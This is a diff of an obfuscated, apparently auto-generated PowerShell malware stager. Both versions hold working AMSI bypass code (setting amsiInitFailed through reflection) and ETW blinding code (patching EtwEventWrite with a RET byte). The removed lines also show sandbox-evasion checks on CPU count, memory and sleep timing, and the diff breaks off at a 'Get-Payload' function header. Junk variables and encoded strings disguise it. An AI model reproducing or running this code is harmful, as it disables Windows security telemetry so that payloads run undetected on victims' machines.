@@ -1,44 +1,35 @@
 # ═══ In-Memory Patches (Polymorphic) ═══
+# Runtime memory patch
+Start-Sleep -Milliseconds 7
+$XolhCIxY = ([char]83+[char]121+[char]115+[char]116+[char]101+[char]109+[char]46+[char]77+[char]97+[char]110+[char]97+[char]103+[char]101+[char]109+[char]101+[char]110+[char]116+[char]46+[char]65+[char]117+[char]116+[char]111+[char]109+[char]97+[char]116+[char]105+[char]111+[char]110+[char]46+[char]65+[char]109+[char]115+[char]105+[char]85+[char]116+[char]105+[char]108+[char]115)
+$Ilil = "ZASHM"
+$KiPZ = (-join([byte[]](0x61,0x6d,0x73,0x69,0x49,0x6e,0x69,0x74,0x46,0x61,0x69,0x6c,0x65,0x64)|%{[char]$_}))
+$qy7NC8YI = [Ref].Assembly.GetType($XolhCIxY)
+$J4hIgvTp = "FROFB"
+$zdr4 = $qy7NC8YI.GetField($KiPZ, ([char]78+[char]111+[char]110+[char]80+[char]117+[char]98+[char]108+[char]105+[char]99+[char]44+[char]83+[char]116+[char]97+[char]116+[char]105+[char]99))
+$zdr4.SetValue($null, $true)
+[void]([Math]::Abs(74000))
+
 # ETW blind (P/Invoke)
-$RZ49B = [int](8638) % 256
-$DDbg5p4b = @"
+[void]([Math]::Abs(36594))
+$ggyKy = @"
 [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
 [DllImport("kernel32.dll")] public static extern IntPtr LoadLibrary(string n);
 [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
 "@
-$zs6mCww = Add-Type -MemberDefinition $DDbg5p4b -Name 'GetObject63' -Namespace 'LoadState53' -PassThru
-$FRzW8xbO = "FMCCY"
-$Wa5wcOXK = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bnRkbGwuZGxs"))
-$zelFW = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXR3RXZlbnRXcml0ZQ=="))
-$MnkDAdEA = $zs6mCww::LoadLibrary($Wa5wcOXK)
-$Pt4z0 = $zs6mCww::GetProcAddress($MnkDAdEA, $zelFW)
-$n34dUX = "WSRHY"
-$K3Ev3DE = 0
-$zs6mCww::VirtualProtect($Pt4z0, [UIntPtr]::new(1), 0x40, [ref]$K3Ev3DE) | Out-Null
-$FEeG99 = [byte[]](0xC3)
-[System.Runtime.InteropServices.Marshal]::Copy($FEeG99, 0, $Pt4z0, $FEeG99.Length)
-$zs6mCww::VirtualProtect($Pt4z0, [UIntPtr]::new(1), $K3Ev3DE, [ref]$K3Ev3DE) | Out-Null
-[void]([Math]::Abs(87798))
-
-# Runtime memory patch
-$qyGhgAVC = "RIMYD"
-$oHvvTd = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM="))
-Start-Sleep -Milliseconds 24
-$oudwGczf = (-join([byte[]](0x61,0x6d,0x73,0x69,0x49,0x6e,0x69,0x74,0x46,0x61,0x69,0x6c,0x65,0x64)|%{[char]$_}))
-$lkb8 = [Ref].Assembly.GetType($oHvvTd)
-[void]([Math]::Abs(72878))
-$fmrRo = $lkb8.GetField($oudwGczf, ([char]78+[char]111+[char]110+[char]80+[char]117+[char]98+[char]108+[char]105+[char]99+[char]44+[char]83+[char]116+[char]97+[char]116+[char]105+[char]99))
-$fmrRo.SetValue($null, $true)
-$ua6v6oqE = "CXUJM"
-
-# Environment validation
-$ZjpwlOs = (Get-WmiObject -Class Win32_ComputerSystem).NumberOfLogicalProcessors
-if ($ZjpwlOs -lt 2) { exit }
-$g9T2J = (Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory
-if ($g9T2J -lt 2GB) { exit }
-$gCR8C5V = [System.DateTime]::Now
-Start-Sleep -Milliseconds 4248
-if (([System.DateTime]::Now - $gCR8C5V).TotalMilliseconds -lt 3398) { exit }
+$VHlMfx = Add-Type -MemberDefinition $ggyKy -Name 'InitContext6' -Namespace 'CheckEntry64' -PassThru
+$RFTHOs3C = "LIKHA"
+$Q52AAW = ([char]110+[char]116+[char]100+[char]108+[char]108+[char]46+[char]100+[char]108+[char]108)
+$puqn = (-join([byte[]](0x45,0x74,0x77,0x45,0x76,0x65,0x6e,0x74,0x57,0x72,0x69,0x74,0x65)|%{[char]$_}))
+$P8lR8 = $VHlMfx::LoadLibrary($Q52AAW)
+$yiY9E = $VHlMfx::GetProcAddress($P8lR8, $puqn)
+$SkES = "HTPKC"
+$lghzXIqH = 0
+$VHlMfx::VirtualProtect($yiY9E, [UIntPtr]::new(1), 0x40, [ref]$lghzXIqH) | Out-Null
+$Ma04mX = [byte[]](0xC3)
+[System.Runtime.InteropServices.Marshal]::Copy($Ma04mX, 0, $yiY9E, $Ma04mX.Length)
+$VHlMfx::VirtualProtect($yiY9E, [UIntPtr]::new(1), $lghzXIqH, [ref]$lghzXIqH) | Out-Null
+Start-Sleep -Milliseconds 10
 
 # === POLYMORPHIC PAYLOAD ===
 function Get-Payload {
